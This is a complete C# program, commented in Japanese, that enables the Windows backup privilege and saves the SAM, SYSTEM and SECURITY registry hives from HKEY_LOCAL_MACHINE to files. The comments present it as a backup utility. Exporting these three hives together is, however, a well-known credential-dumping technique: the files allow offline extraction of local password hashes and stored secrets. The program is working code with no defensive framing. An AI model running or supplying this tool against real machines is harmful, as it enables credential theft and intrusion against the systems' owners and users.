using System;
using System.IO;
using System.Runtime.InteropServices;

class Program
{
    // ======== 特権有効化用のWinAPI ============
    [DllImport("advapi32.dll", SetLastError = true)]
    static extern bool OpenProcessToken(IntPtr ProcessHandle, uint DesiredAccess, out IntPtr TokenHandle);

    [DllImport("advapi32.dll", SetLastError = true, CharSet = CharSet.Auto)]
    static extern bool LookupPrivilegeValue(string lpSystemName, string lpName, out LUID lpLuid);

    [DllImport("advapi32.dll", SetLastError = true)]
    static extern bool AdjustTokenPrivileges(
        IntPtr TokenHandle,
        bool DisableAllPrivileges,
        ref TOKEN_PRIVILEGES NewState,
        uint BufferLength,
        IntPtr PreviousState,
        IntPtr ReturnLength);

    [DllImport("kernel32.dll")]
    static extern IntPtr GetCurrentProcess();

    const uint TOKEN_ADJUST_PRIVILEGES = 0x0020;
    const uint TOKEN_QUERY = 0x0008;
    const string SE_BACKUP_NAME = "SeBackupPrivilege";
    const uint SE_PRIVILEGE_ENABLED = 0x2;

    [StructLayout(LayoutKind.Sequential)]
    struct LUID
    {
        public uint LowPart;
        public int HighPart;
    }

    [StructLayout(LayoutKind.Sequential)]
    struct LUID_AND_ATTRIBUTES
    {
        public LUID Luid;
        public uint Attributes;
    }

    [StructLayout(LayoutKind.Sequential)]
    struct TOKEN_PRIVILEGES
    {
        public uint PrivilegeCount;
        [MarshalAs(UnmanagedType.ByValArray, SizeConst = 1)]
        public LUID_AND_ATTRIBUTES[] Privileges;
    }

    static bool EnableBackupPrivilege()
    {
        if (!OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, out IntPtr tokenHandle))
        {
            Console.WriteLine("OpenProcessToken エラー: " + Marshal.GetLastWin32Error());
            return false;
        }
        if (!LookupPrivilegeValue(null, SE_BACKUP_NAME, out LUID luid))
        {
            Console.WriteLine("LookupPrivilegeValue エラー: " + Marshal.GetLastWin32Error());
            return false;
        }
        TOKEN_PRIVILEGES tp = new TOKEN_PRIVILEGES
        {
            PrivilegeCount = 1,
            Privileges = new LUID_AND_ATTRIBUTES[1]
        };
        tp.Privileges[0].Luid = luid;
        tp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;

        if (!AdjustTokenPrivileges(tokenHandle, false, ref tp, 0, IntPtr.Zero, IntPtr.Zero))
        {
            Console.WriteLine("AdjustTokenPrivileges エラー: " + Marshal.GetLastWin32Error());
            return false;
        }
        int err = Marshal.GetLastWin32Error();
        if (err != 0)
        {
            Console.WriteLine("AdjustTokenPrivileges 後のエラーコード: " + err);
            return false;
        }
        return true;
    }

    // ======== レジストリ操作用WinAPI ============
    [DllImport("advapi32.dll", SetLastError = true, CharSet = CharSet.Auto)]
    static extern int RegSaveKey(IntPtr hKey, string lpFile, IntPtr lpSecurityAttributes);

    [DllImport("advapi32.dll", SetLastError = true, CharSet = CharSet.Auto)]
    static extern int RegOpenKeyEx(IntPtr hKey, string subKey, uint ulOptions, int samDesired, out IntPtr phkResult);

    [DllImport("advapi32.dll", SetLastError = true)]
    static extern int RegCloseKey(IntPtr hKey);

    // HKLM の定数定義（HKEY_LOCAL_MACHINE = 0x80000002）
    static readonly IntPtr HKEY_LOCAL_MACHINE = new IntPtr(unchecked((int)0x80000002));
    const int KEY_READ = 0x20019;

    static void saveReg(string subKey, string saveFilePath)
    {
        // もし既に保存先ファイルが存在する場合は削除
        if (File.Exists(saveFilePath))
        {
            try
            {
                File.Delete(saveFilePath);
            }
            catch (Exception ex)
            {
                Console.WriteLine("既存のバックアップファイルの削除に失敗しました: " + ex.Message);
                return;
            }
        }

        // レジストリの保存
        IntPtr hKey;

        int result = RegOpenKeyEx(HKEY_LOCAL_MACHINE, subKey, 0, KEY_READ, out hKey);
        if (result != 0)
        {
            Console.WriteLine("レジストリキーを開く際にエラーが発生しました。エラーコード: " + result);
            return;
        }

        result = RegSaveKey(hKey, saveFilePath, IntPtr.Zero);
        if (result != 0)
        {
            Console.WriteLine("レジストリキーの保存に失敗しました。エラーコード: " + result);
        }
        else
        {
            Console.WriteLine("レジストリキーが正常に保存されました。保存先: " + saveFilePath);
        }
        RegCloseKey(hKey);
    }

    static void Main(string[] args)
    {
        // コマンドライン引数から保存先を取得
        // 指定がなければ実行ファイルと同じフォルダに保存
        string saveFolderPath;
        if (args.Length > 0)
        {
            saveFolderPath = args[0];
        }
        else
        {
            saveFolderPath = AppDomain.CurrentDomain.BaseDirectory;
        }

        // バックアップ権限の有効化
        if (!EnableBackupPrivilege())
        {
            Console.WriteLine("バックアップ権限の有効化に失敗しました。プログラムを管理者として実行し、必要な権限があるか確認してください。");
            return;
        }

        // HKLMのsam, system, securityを保存
        string samKey = @"SAM";
        string systemKey = @"SYSTEM";
        string securityKey = @"SECURITY";

        string samSavePath = Path.Combine(saveFolderPath, "sam.hiv");
        string systemSavePath = Path.Combine(saveFolderPath, "system.hiv");
        string securitySavePath = Path.Combine(saveFolderPath, "security.hiv");

        saveReg(samKey, samSavePath);
        saveReg(systemKey, systemSavePath);
        saveReg(securityKey, securitySavePath);
    }
}

